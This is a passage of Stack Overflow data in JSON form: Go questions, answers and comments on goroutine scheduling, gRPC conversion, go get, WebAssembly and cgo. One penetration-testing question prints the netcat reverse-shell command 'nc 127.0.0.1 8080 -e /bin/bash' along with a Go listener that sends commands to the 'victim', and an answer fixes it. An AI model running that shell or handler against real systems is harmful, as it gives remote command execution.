"registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 3, "creation_date": 1540404499, "post_id": 52975260, "comment_id": 92857393, "body": "If you&#39;re running this within the tour or on Go playground, also note that it runs a single thread. But generally speaking, you should not have <i>any</i> expectations about the order of execution of concurrent operations."}], "answers": [{"comments": [{"owner": {"reputation": 64542, "user_id": 10008173, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3ea5d6d5d63e054acb8cfa95a39240d?s=128&d=identicon&r=PG&f=1", "display_name": "David Maze", "link": "https://stackoverflow.com/users/10008173/david-maze"}, "edited": false, "score": 1, "creation_date": 1540424085, "post_id": 52978529, "comment_id": 92865075, "body": "Item 2 isn&#39;t guaranteed by the language, right?  As soon as one send has completed and there&#39;s in item in the channel buffer, a receive <i>could</i> execute?"}, {"owner": {"reputation": 799, "user_id": 2980967, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ecQ8D.jpg?s=128&g=1", "display_name": "dustinevan", "link": "https://stackoverflow.com/users/2980967/dustinevan"}, "reply_to_user": {"reputation": 64542, "user_id": 10008173, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3ea5d6d5d63e054acb8cfa95a39240d?s=128&d=identicon&r=PG&f=1", "display_name": "David Maze", "link": "https://stackoverflow.com/users/10008173/david-maze"}, "edited": false, "score": 0, "creation_date": 1540451473, "post_id": 52978529, "comment_id": 92872434, "body": "right. &quot;always&quot; is a strong word. But 99.???% of the time, this is going to happen. Go playground is single threaded so I think it will <i>always</i> happen"}], "tags": [], "owner": {"reputation": 799, "user_id": 2980967, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ecQ8D.jpg?s=128&g=1", "display_name": "dustinevan", "link": "https://stackoverflow.com/users/2980967/dustinevan"}, "is_accepted": false, "score": 2, "last_activity_date": 1540507543, "last_edit_date": 1540507543, "creation_date": 1540418700, "answer_id": 52978529, "question_id": 52975260, "link": "https://stackoverflow.com/questions/52975260/concurrency-vs-parallelism-when-executing-a-goroutine/52978529#52978529", "title": "Concurrency vs parallelism when executing a goroutine", "body": "<p>A few things here. </p>\n\n<ol>\n<li><p>You have 2 <code>goroutines</code>, one running <code>main()</code>, and one running <code>fibonacci()</code>. Because this is a small program, there isn't a good reason for the go scheduler not to run them one after another on the same thread, so that's what happens consistently, though it isn't guaranteed. Because the <code>goroutine</code> in <code>main()</code> is waiting for the <code>chan</code>, the <code>fibonacci()</code> routine is scheduled first. It's important to remember that <code>goroutines</code> aren't threads, they're routines that the go scheduler runs on threads according to its liking. </p></li>\n<li><p>Because you're passing the length of the buffered channel to <code>fibonacci()</code> there will almost certainly (<em>never rely on this behavior</em>) be <code>cap(c)</code> <code>heres</code> printed after which the <code>channel</code> is filled, the <code>for</code> loop finishes, a <code>close</code> is sent to the <code>chan</code>, and the <code>goroutine</code> finishes. Then the <code>main()</code> goroutine is scheduled and <code>cap(c)</code> fibonacci's will be printed. If the buffered <code>chan</code> had filled up, then <code>main()</code> would have been rescheduled: \n<a href=\"https://play.golang.org/p/_IgFIO1K-Dc\" rel=\"nofollow noreferrer\">https://play.golang.org/p/_IgFIO1K-Dc</a></p></li>\n<li><p>By sleeping you can tell the go scheduler to give up control. But in practice never do this. Restructure in some way or, if you must, use a Waitgroup. See: <a href=\"https://play.golang.org/p/Ln06-NYhQDj\" rel=\"nofollow noreferrer\">https://play.golang.org/p/Ln06-NYhQDj</a></p></li>\n<li><p>I think you're trying to do this: <a href=\"https://play.golang.org/p/8Xo7iCJ8Gj6\" rel=\"nofollow noreferrer\">https://play.golang.org/p/8Xo7iCJ8Gj6</a></p></li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 5906, "user_id": 76091, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/w78it.jpg?s=128&g=1", "display_name": "Neil Fenwick", "link": "https://stackoverflow.com/users/76091/neil-fenwick"}, "is_accepted": true, "score": 1, "last_activity_date": 1540490472, "last_edit_date": 1540490472, "creation_date": 1540421004, "answer_id": 52978908, "question_id": 52975260, "link": "https://stackoverflow.com/questions/52975260/concurrency-vs-parallelism-when-executing-a-goroutine/52978908#52978908", "title": "Concurrency vs parallelism when executing a goroutine", "body": "<p>I think what you are observing is that Go has its own scheduler, and at the same time there is a distinction between \"concurrency\" and \"parallelism\".  In the words of Rob Pike: <a href=\"https://blog.golang.org/concurrency-is-not-parallelism\" rel=\"nofollow noreferrer\">Concurrency is not Parallelism</a></p>\n\n<p>Goroutines are much more lightweight than OS threads and they are managed in \"userland\" (within the Go process) as opposed to the operating system.  Some programs have many thousands (even tens of thousands) of goroutines running, whilst there would certainly be far fewer operating system threads allocated. (This is one of Go's major strengths in asynchronous programs with many routines)</p>\n\n<p>Because your program is so simple, and the channel buffered, it does not block on writing to the channel:</p>\n\n<pre><code>c &lt;- x\n</code></pre>\n\n<p>The fibonacci goroutine isn't getting preempted before it completes the short loop.</p>\n\n<p>Even the <code>fmt.Println(\"here\")</code> doesn't deterministically introduce preemption - I learned something myself there in writing this answer.  It is buffered, <a href=\"https://golang.org/pkg/fmt/\" rel=\"nofollow noreferrer\">like the analagous printf and scanf from C</a>.\n(see the source code <a href=\"https://github.com/golang/go/blob/master/src/fmt/print.go\" rel=\"nofollow noreferrer\">https://github.com/golang/go/blob/master/src/fmt/print.go</a>)</p>\n\n<p>For interest, if you wanted to artificially control the number of OS threads, you can set the GOMAXPROCS environment variable on the command line:</p>\n\n<pre><code>~$ GOMAXPROCS=1 go run main.go\n</code></pre>\n\n<p><strong><em>However, with your simple program there probably would be no discernable difference</em></strong>, because the Go runtime is still perfectly capable of scheduling many goroutines against 1 OS thread.</p>\n\n<p>For example, here is a minor variation to your program.  By making the channel buffer smaller (5), but still iterating 10 times, we introduce a point at which the fibonacci go routine <em>can</em> (but won't necessarily) be preempted, where it could block at least once on writing to the channel:</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n)\n\nfunc fibonacci(n int, c chan int) {\n    x, y := 0, 1\n    for i := 0; i &lt; n; i++ {\n        c &lt;- x\n        x, y = y, x+y\n        fmt.Println(\"here\")\n    }\n    close(c)\n}\n\nfunc main() {\n    c := make(chan int, 5)\n    go fibonacci(cap(c)*2, c)\n    for i := range c {\n        fmt.Println(i)\n    }\n}\n\n~$ GOMAXPROCS=1 go run main.go\nhere\nhere\nhere\nhere\nhere\nhere\n0\n1\n1\n2\n3\n5\n8\nhere\nhere\nhere\nhere\n13\n21\n34\n</code></pre>\n\n<p><a href=\"https://www.quora.com/How-does-the-golang-scheduler-work\" rel=\"nofollow noreferrer\">Long explanation here</a>, short explanation is that there are a multitude of reasons that a go routine can temporarily block and those are ideal opportunities for the go scheduler to schedule execution of another go routine.</p>\n"}], "owner": {"reputation": 1622, "user_id": 3407736, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/b17228b71d87b56d2d31cb344c5a5278?s=128&d=identicon&r=PG&f=1", "display_name": "Always_Beginner", "link": "https://stackoverflow.com/users/3407736/always-beginner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1509, "favorite_count": 0, "accepted_answer_id": 52978908, "answer_count": 2, "score": 3, "last_activity_date": 1540507543, "creation_date": 1540403765, "last_edit_date": 1540490640, "question_id": 52975260, "link": "https://stackoverflow.com/questions/52975260/concurrency-vs-parallelism-when-executing-a-goroutine", "title": "Concurrency vs parallelism when executing a goroutine", "body": "<p>A fairly naive go question. I was going through go-concurrency tutorial and I came across this <a href=\"https://tour.golang.org/concurrency/4\" rel=\"nofollow noreferrer\">https://tour.golang.org/concurrency/4</a>.</p>\n\n<p>I modified the code to add a print statement in the fibonacci function. So the code looks something like</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n)\n\nfunc fibonacci(n int, c chan int) {\n    x, y := 0, 1\n    for i := 0; i &lt; n; i++ {\n        c &lt;- x\n        x, y = y, x+y\n        fmt.Println(\"here\")\n    }\n    close(c)\n}\n\nfunc main() {\n    c := make(chan int, 10)\n    go fibonacci(cap(c), c)\n    for i := range c {\n        fmt.Println(i)\n    }\n}\n</code></pre>\n\n<p>And I got this as an output </p>\n\n<pre><code>here\nhere\nhere\nhere\nhere\nhere\nhere\nhere\nhere\nhere\n0\n1\n1\n2\n3\n5\n8\n13\n21\n34\n</code></pre>\n\n<p>I was expecting <code>here</code> and the <code>numbers</code> to be interleaved. (Since the routine gets executed concurrently)\nI think I am missing something basic about go-routines. Not quite sure what though.</p>\n"}, {"tags": ["json", "go", "grpc"], "comments": [{"owner": {"reputation": 4055, "user_id": 2598037, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sWCTo.jpg?s=128&g=1", "display_name": "Carl Mastrangelo", "link": "https://stackoverflow.com/users/2598037/carl-mastrangelo"}, "edited": false, "score": 1, "creation_date": 1540401789, "post_id": 52974336, "comment_id": 92855896, "body": "One possibility is that you can add methods to Go&#39;s generated proto structs.   Conversion between Protos (which are meant for transport and storage) aren&#39;t very good domain objects, so there is some manual conversion if you need more advanced functionality."}], "owner": {"reputation": 403, "user_id": 3902270, "user_type": "registered", "profile_image": "https://graph.facebook.com/100006418927672/picture?type=large", "display_name": "Karl Andresen", "link": "https://stackoverflow.com/users/3902270/karl-andresen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 786, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1540400815, "creation_date": 1540400179, "last_edit_date": 1540400815, "question_id": 52974336, "link": "https://stackoverflow.com/questions/52974336/golang-and-grpc-marshal-unmarshal-or-manual-approach", "title": "Golang and gRPC Marshal/Unmarshal or manual approach", "body": "<p>Following the \"clean architecture\", I'm now implementing a gRPC delivery package to interact with my managers(services). My domain entities are defined as pure Go structs with json tagging. The storage layer have its own definitions of the entities to allow custom types (such as sql.NullInt64). Here I use a manual approach to convert domain entities to sql types and vice versa. On the handler side, I see the same pattern emerges. I have to convert from/to gRPC types.</p>\n\n<p>gRPC entity struct &lt;-> Domain entity struct &lt;-> SQL entity struct</p>\n\n<p>I tested the following and it seems to work:</p>\n\n<pre><code>func (h *RPCHandler) DescribeRealm(ctx context.Context, in\n*pb.DescribeRealmReq) (*pb.DescribeRealmResp, error) {\n\nrlm, err := h.Manager.DescribeRealm(ctx, in.GetRealmId())\nif err != nil {\n    return nil, err\n}\n\njb, err := json.Marshal(rlm)\nif err != nil {\n    return nil, err\n}\n\nr := &amp;pb.Realm{}\nif err := jsonpb.Unmarshal(bytes.NewReader(jb), r); err != nil {\n    return nil, err\n}\n\nreturn &amp;pb.DescribeRealmResp{\n    Realm: r,\n}, nil\n</code></pre>\n\n<p>My question is as follows:</p>\n\n<p>Is this the preferred way to convert data between the different types of structs/layers, or should I stick with the manual approach?</p>\n\n<p>Best regards, Karl.</p>\n"}, {"tags": ["docker", "go"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 1, "creation_date": 1540399327, "post_id": 52974058, "comment_id": 92854613, "body": "<code>go get</code> pulls master@HEAD. If you want more control, take a look at the new modules setup in Go 1.11, or any of the many Go dependency managers out there."}, {"owner": {"reputation": 33, "user_id": 2218703, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2d9e8f525ad2d85ed70c8cf47bdf736?s=128&d=identicon&r=PG", "display_name": "andrey_derma", "link": "https://stackoverflow.com/users/2218703/andrey-derma"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540399692, "post_id": 52974058, "comment_id": 92854839, "body": "@Adrian Is there a package manager for go? like pip, composer or npm?"}, {"owner": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "edited": false, "score": 0, "creation_date": 1540400012, "post_id": 52974058, "comment_id": 92855008, "body": "which version of go you were using?"}, {"owner": {"reputation": 33, "user_id": 2218703, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2d9e8f525ad2d85ed70c8cf47bdf736?s=128&d=identicon&r=PG", "display_name": "andrey_derma", "link": "https://stackoverflow.com/users/2218703/andrey-derma"}, "reply_to_user": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "edited": false, "score": 0, "creation_date": 1540400067, "post_id": 52974058, "comment_id": 92855037, "body": "@nilsocket im using 1.10.2"}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 1, "creation_date": 1540400527, "post_id": 52974058, "comment_id": 92855267, "body": "There are several, but <i>Questions asking us to recommend or find a book, tool, software library, tutorial or other off-site resource are off-topic for Stack Overflow as they tend to attract opinionated answers and spam.</i>"}, {"owner": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "edited": false, "score": 0, "creation_date": 1540400561, "post_id": 52974058, "comment_id": 92855280, "body": "package versioning is added to <code>go</code> in <code>1.11</code> it&#39;s in experimental phase , if the package which you are using have .mod file, then see <a href=\"https://github.com/golang/go/wiki/Modules#how-to-install-and-activate-module-support\" rel=\"nofollow noreferrer\">here</a>, to known more about module support read this <a href=\"https://github.com/golang/go/wiki/Modules\" rel=\"nofollow noreferrer\">wiki</a>."}, {"owner": {"reputation": 33, "user_id": 2218703, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2d9e8f525ad2d85ed70c8cf47bdf736?s=128&d=identicon&r=PG", "display_name": "andrey_derma", "link": "https://stackoverflow.com/users/2218703/andrey-derma"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540400920, "post_id": 52974058, "comment_id": 92855476, "body": "@Adrian I think the question still related, because im confusing how go get works, I actually a python and php developer, and im using package manager to install a library from outside, that\u2019s why im asking instead of feature like \u201cmodules\u201d is there another tools like composer or pip"}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540401053, "post_id": 52974058, "comment_id": 92855543, "body": "I&#39;m not saying it&#39;s not relevant, but it&#39;s off-topic for this site, for the stated reason."}, {"owner": {"reputation": 33, "user_id": 2218703, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2d9e8f525ad2d85ed70c8cf47bdf736?s=128&d=identicon&r=PG", "display_name": "andrey_derma", "link": "https://stackoverflow.com/users/2218703/andrey-derma"}, "reply_to_user": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "edited": false, "score": 0, "creation_date": 1540401641, "post_id": 52974058, "comment_id": 92855819, "body": "@nilsocket yup still experimental phase, do you use go get to install library from outside in your go project? or you have your own way to handle this case"}, {"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 0, "creation_date": 1540404451, "post_id": 52974058, "comment_id": 92857368, "body": "I believe dep is the preferred dependency manager for Go before 1.11 <a href=\"https://github.com/golang/dep\" rel=\"nofollow noreferrer\">github.com/golang/dep</a>"}, {"owner": {"reputation": 1209, "user_id": 8256506, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PlvCt.png?s=128&g=1", "display_name": "nilsocket", "link": "https://stackoverflow.com/users/8256506/nilsocket"}, "edited": false, "score": 0, "creation_date": 1540440877, "post_id": 52974058, "comment_id": 92868657, "body": "use the environment variable for now, and it seems <code>mux</code> doesn&#39;t depend on anything but <code>stdlib</code>."}], "owner": {"reputation": 33, "user_id": 2218703, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2d9e8f525ad2d85ed70c8cf47bdf736?s=128&d=identicon&r=PG", "display_name": "andrey_derma", "link": "https://stackoverflow.com/users/2218703/andrey-derma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1906, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1540453692, "creation_date": 1540399064, "last_edit_date": 1540453692, "question_id": 52974058, "link": "https://stackoverflow.com/questions/52974058/go-get-specific-version", "title": "go get specific version", "body": "<p>I want to know how go get works, because when im using a libary from github (for example gorilla/mux) the documentation said to install it I should type \"go get -u github.com/gorilla/mux\", it strange without specific version.!</p>\n\n<p>As far as i know it always use from master branch.\nWhat happen if the owner of the library update the code? Is it gonna be deprecated or something?</p>\n\n<p>Because in my case, im using docker to build the project, every time I build the image, it always do \"go get\"</p>\n\n<p>Is there any best practice to using go get?</p>\n"}, {"tags": ["go", "server", "netcat", "penetration-testing"], "comments": [{"owner": {"reputation": 49960, "user_id": 32453, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/bec38d63650c8912b6ba9b557fb953b9?s=128&d=identicon&r=PG", "display_name": "rogerdpack", "link": "https://stackoverflow.com/users/32453/rogerdpack"}, "edited": false, "score": 2, "creation_date": 1540399181, "post_id": 52974041, "comment_id": 92854519, "body": "what do you mean by &quot;catch&quot; it?"}, {"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 1, "creation_date": 1540399433, "post_id": 52974041, "comment_id": 92854677, "body": "Creating and discarding bufio.Readers in the loop is likely to cause a problem because this will discard any buffered data in the readers.  Create the readers outside of the loop.  Also, bufio.Scanner is generally preferred over bufio.Reader when reading lines."}], "answers": [{"tags": [], "owner": {"reputation": 37, "user_id": 10372559, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-B31-tOfZ5po/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaOLkuN6BACRXbwyER5-ooTpOb2LNw/mo/photo.jpg?sz=128", "display_name": "Mike", "link": "https://stackoverflow.com/users/10372559/mike"}, "is_accepted": false, "score": 0, "last_activity_date": 1540399208, "creation_date": 1540399208, "answer_id": 52974102, "question_id": 52974041, "link": "https://stackoverflow.com/questions/52974041/how-do-i-catch-a-netcat-reverse-shell/52974102#52974102", "title": "How do I catch a netcat reverse shell?", "body": "<p>I solved my problem immediately after I posted my question (d'oh!).\nAnyways, the solution is simple: reverse the read and write logic.\nAfter that, everything worked as desired.</p>\n\n<p>Here's the fixed code:</p>\n\n<pre><code>func handleConn(conn net.Conn) {\n    fmt.Println(\"Connection received.\")\n    for {\n        // Read command from Stdin and send to victim\n        reader := bufio.NewReader(os.Stdin)\n        cmd, _ := reader.ReadString('\\n')\n        fmt.Fprintln(conn, cmd)\n\n        // Receive input from connection\n        data, _ := bufio.NewReader(conn).ReadString('\\n')\n        fmt.Println(data)\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 37, "user_id": 10372559, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-B31-tOfZ5po/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaOLkuN6BACRXbwyER5-ooTpOb2LNw/mo/photo.jpg?sz=128", "display_name": "Mike", "link": "https://stackoverflow.com/users/10372559/mike"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 213, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1540413619, "creation_date": 1540399003, "last_edit_date": 1540413619, "question_id": 52974041, "link": "https://stackoverflow.com/questions/52974041/how-do-i-catch-a-netcat-reverse-shell", "title": "How do I catch a netcat reverse shell?", "body": "<p>I am working on a TCP server in Go.\nThe TCP server needs to be able to catch a reverse shell from netcat:</p>\n\n<pre><code>$ nc 127.0.0.1 8080 -e /bin/bash\n</code></pre>\n\n<p>I should be able to send commands and receive responses; however, my server just seems to hang when it receives a connection.</p>\n\n<p>I think the problem is with the bufio.NewReader(conn).ReadString('\\n') line, but I don't know how to fix it.</p>\n\n<p>Can you offer any solutions, please and thank you?</p>\n\n<p>Server Code (note: error handling omitted for brevity):</p>\n\n<pre><code>func main() {\n    ln, _ := net.Listen(\"tcp\", \"127.0.0.1:8080\")\n    for {\n        conn, _ := ln.Accept()\n        handleConn(conn)\n    }\n}\n\nfunc handleConn(conn net.Conn) {\n    for {\n        // Receive data from netcat victim\n        data, _ := bufio.NewReader(conn).ReadString('\\n')\n        fmt.Println(data)\n\n        // Read command from Stdin then send to netcat victim\n        reader := bufio.NewReader(os.Stdin)\n        cmd, _ := reader.ReadString('\\n')\n        fmt.Fprintln(conn, cmd)\n    }\n}\n</code></pre>\n"}, {"tags": ["go", "webassembly"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540394331, "post_id": 52972534, "comment_id": 92851513, "body": "1) &quot;This package is EXPERIMENTAL. Its current scope is only to allow tests to run, but not yet to provide a comprehensive API for users.&quot; 2) JS and DOM are two separate things. The JS package allows you to make calls to JS functions, it does not include a complete Go implementation of JS DOM. 3) The Wiki link you posted suggests using <a href=\"https://github.com/dennwc/dom\" rel=\"nofollow noreferrer\">github.com/dennwc/dom</a> for DOM manipulation. Have you tried it?"}, {"owner": {"reputation": 910, "user_id": 426853, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/b7fbf02bd4eb6fa180937d44a6afdcd0?s=128&d=identicon&r=PG", "display_name": "Mike Ellis", "link": "https://stackoverflow.com/users/426853/mike-ellis"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540396143, "post_id": 52972534, "comment_id": 92852697, "body": "@Adrian Thanks. I looked at the DOM library. It will probably be useful later but I like to avoid extra packages while I&#39;m still taking baby steps.  For now, icza&#39;s answer meets my needs."}], "answers": [{"comments": [{"owner": {"reputation": 910, "user_id": 426853, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/b7fbf02bd4eb6fa180937d44a6afdcd0?s=128&d=identicon&r=PG", "display_name": "Mike Ellis", "link": "https://stackoverflow.com/users/426853/mike-ellis"}, "edited": false, "score": 0, "creation_date": 1540395818, "post_id": 52972848, "comment_id": 92852491, "body": "Thanks! That worked after I fixed the typo in the last line. Should be <code>body.Set </code> instead of <code>body.SetValue</code>."}, {"owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "reply_to_user": {"reputation": 910, "user_id": 426853, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/b7fbf02bd4eb6fa180937d44a6afdcd0?s=128&d=identicon&r=PG", "display_name": "Mike Ellis", "link": "https://stackoverflow.com/users/426853/mike-ellis"}, "edited": false, "score": 0, "creation_date": 1540396227, "post_id": 52972848, "comment_id": 92852752, "body": "@MikeEllis Yes, it&#39;s <code>body.Set()</code>. Thanks."}], "tags": [], "owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "is_accepted": true, "score": 6, "last_activity_date": 1540411528, "last_edit_date": 1540411528, "creation_date": 1540395128, "answer_id": 52972848, "question_id": 52972534, "link": "https://stackoverflow.com/questions/52972534/how-can-i-access-dom-element-properties-from-go-webassembly/52972848#52972848", "title": "How can I access DOM Element properties from Go WebAssembly?", "body": "<p>To get the value of any property of some JavaScript object, use the <a href=\"https://golang.org/pkg/syscall/js/#Value.Get\" rel=\"nofollow noreferrer\"><code>Value.Get()</code></a> method (you actually already used it when you accessed the document object by calling <code>js.Global().Get(\"document\")</code>). Similarly, to set a value of a property, use <a href=\"https://golang.org/pkg/syscall/js/#Value.Set\" rel=\"nofollow noreferrer\"><code>Value.Set()</code></a>.</p>\n\n<p>The name of the property whose value to get / set is simply a Go <code>string</code> value, <code>\"innerHTML\"</code> in your case. The value to be set may be many of Go values (e.g. <code>string</code>, integer numbers, floating point numbers, <code>bool</code>, slices, maps etc.), the <a href=\"https://golang.org/pkg/syscall/js/#ValueOf\" rel=\"nofollow noreferrer\"><code>js.ValueOf()</code></a> function is used to obtain a <a href=\"https://golang.org/pkg/syscall/js/#Value\" rel=\"nofollow noreferrer\"><code>js.Value()</code></a> that will be set ultimately. In your case, you may simply use the Go <code>string</code> value <code>\"Dynamic Content\"</code>.</p>\n\n<pre><code>doc := js.Global().Get(\"document\")\nbody := doc.Call(\"getElementById\", \"thebody\")\nbody.Set(\"innerHTML\", \"Dynamic Content\")\n</code></pre>\n"}], "owner": {"reputation": 910, "user_id": 426853, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/b7fbf02bd4eb6fa180937d44a6afdcd0?s=128&d=identicon&r=PG", "display_name": "Mike Ellis", "link": "https://stackoverflow.com/users/426853/mike-ellis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1661, "favorite_count": 0, "accepted_answer_id": 52972848, "answer_count": 1, "score": 3, "last_activity_date": 1540411528, "creation_date": 1540394120, "question_id": 52972534, "link": "https://stackoverflow.com/questions/52972534/how-can-i-access-dom-element-properties-from-go-webassembly", "title": "How can I access DOM Element properties from Go WebAssembly?", "body": "<p>I'm trying to extend the \"Hello WebAssembly\" example from <a href=\"https://github.com/golang/go/wiki/WebAssembly\" rel=\"nofollow noreferrer\">https://github.com/golang/go/wiki/WebAssembly</a>. As given, the example simply prints a message to the console. I wanted to add some code using <code>syscall/js</code> to replace the body element content.</p>\n\n<p>The attempt below fails to build:</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n\n    \"syscall/js\"\n)\n\nfunc main() {\n    fmt.Println(\"Hello, WebAssembly!\") // original example\n    // I added\n    doc := js.Global().Get(\"document\")\n    body := doc.Call(\"getElementById\", \"thebody\")\n    body.innerHTML = \"Dynamic Content\"\n}\n</code></pre>\n\n<p>When I try to build with <code>$ env GOOS=js GOARCH=wasm go build -o main.wasm</code>\nI get :\n<code>\n./wasm.go:14:6: body.innerHTML undefined (type js.Value has no field or method innerHTML)\n</code></p>\n\n<p>Not surprising when you think about it, but I don't see an example in the doc at <a href=\"https://godoc.org/syscall/js\" rel=\"nofollow noreferrer\">https://godoc.org/syscall/js</a> that explains how to get and set element properties.</p>\n"}, {"tags": ["c", "linux", "string", "go", "go-interface"], "owner": {"reputation": 11, "user_id": 6044224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/150e404f49b4e2b61306c3c5e7cf3824?s=128&d=identicon&r=PG&f=1", "display_name": "Hemant", "link": "https://stackoverflow.com/users/6044224/hemant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 91, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1540391361, "creation_date": 1540391361, "question_id": 52971548, "link": "https://stackoverflow.com/questions/52971548/how-to-use-and-implement-empty-golang-interface-in-c-programming", "title": "How to use and implement empty golang interface { } in C programming", "body": "<p>string_operation.go (golang function)</p>\n\n<pre><code>//export AddString\nfunc AddString(str string, v interface{}) bool {\n        somestrings = append(somestrings, str);\n        xyz.Compile(str, v)\n        fmt.Println(\"Added!!\\n\");\n    }\n    return true;\n}\n\n//export SearchString\nfunc SearchString(str string) (v interface{}, ok bool) {\n    v, ok = xyz.Match(str);\n    if ok == true {\n        fmt.Println(\"Found!!\");\n    } else {\n        fmt.Println(\"Not found!!\");\n    }\n    return\n}\n</code></pre>\n\n<p>Above golang file when exported to use in C code</p>\n\n<p>string_operation.h (Exported Header file)    </p>\n\n<pre><code>typedef struct { const char *p; GoInt n; } GoString;\ntypedef struct 